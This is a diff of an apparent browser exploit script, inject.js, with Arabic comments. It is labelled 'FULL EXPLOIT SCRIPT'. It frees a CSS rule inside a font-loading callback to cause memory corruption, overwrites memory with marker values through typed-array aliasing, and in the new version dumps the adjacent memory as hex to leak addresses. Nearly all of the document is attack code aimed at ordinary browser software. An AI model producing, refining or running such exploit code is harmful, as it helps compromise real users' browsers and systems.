@@ -1,14 +1,14 @@
 /**
- * [FULL EXPLOIT SCRIPT] - Memory Corruption & Crash Analysis
+ * [FULL EXPLOIT SCRIPT] - Memory Dumper & Address Leak
  * الملف: inject.js
- * الوظيفة: محاولة إحداث Memory Corruption للسيطرة على الـ Execution Flow
+ * الوظيفة: إحداث تداخل في الذاكرة وقراءة البيانات الخام لاستخراج العناوين
  */
 
-ssa("[*] بدء تشغيل سكريبت الاستغلال الكامل...");
+ssa("[*] بدء تشغيل سكريبت الاستغلال الكامل (Memory Dumper)...");
 
 function runFullExploit() {
     try {
-        // 1. إعداد الضحية (مصفوفة سنحاول التلاعب بذاكرتها)
+        // 1. مصفوفة الضحية (نستخدمها كمنصة لقراءة الذاكرة)
         let victimArray = new Float64Array(8);
         for (let i = 0; i < victimArray.length; i++) victimArray[i] = 1.1;
 
@@ -32,29 +32,40 @@ function runFullExploit() {
                     triggered = true;
                     ssa("[!!] [!!!] معالج التزامن: بدء التلاعب الذاكري...");
                     
-                    // تحرير الكائن
                     document.getElementById('exploit_style').sheet.deleteRule(0);
                     
-                    // استغلال عدواني: الكتابة في الذاكرة المجاورة
-                    // نستخدم BigUint64Array للوصول إلى العناوين الذاكرية مباشرة (64-bit)
+                    // استخدام BigUint64Array للكتابة المباشرة على الذاكرة
                     let corruptor = new BigUint64Array(victimArray.buffer);
-                    corruptor[0] = 0x4141414141414141n; // عنوان غير صالح لإحداث Crash
+                    corruptor[0] = 0x4141414141414141n; 
                     corruptor[1] = 0x4242424242424242n;
                 }
                 return undefined;
             }
         });
 
-        // 4. إطلاق عملية التحميل
         document.fonts.load('1em x', 'AB');
 
-        // 5. التحقق من النتيجة (هل حدث فساد في الذاكرة؟)
+        // 4. دالة تسريب الذاكرة (Memory Dumper)
         setTimeout(() => {
-            ssa("[*] التحقق من حالة الذاكرة...");
-            if (victimArray[0] !== 1.1) {
-                ssa("[!!!] [SUCCESS] تم تعديل الذاكرة بنجاح! القيمة: " + victimArray[0]);
+            ssa("[*] بدء فحص الذاكرة المجاورة (Memory Dump)...");
+            
+            let dump = "";
+            for (let i = 0; i < 8; i++) {
+                let buf = new ArrayBuffer(8);
+                let f64 = new Float64Array(buf);
+                let u64 = new BigUint64Array(buf);
+                
+                f64[0] = victimArray[i];
+                dump += u64[0].toString(16) + " | ";
+            }
+            
+            ssa("[+] محتوى الذاكرة (Hex Dump):");
+            ssa(dump);
+            
+            if (dump.includes("4141414141414141")) {
+                ssa("[!!!] [SUCCESS] تم التأكد من نجاح الكتابة في الذاكرة.");
             } else {
-                ssa("[-] لم يتم تعديل الذاكرة. الحماية لا تزال فعالة.");
+                ssa("[-] لم تظهر قيم التلاعب. المحرك قد قام بعملية Garbage Collection.");
             }
         }, 500);
 
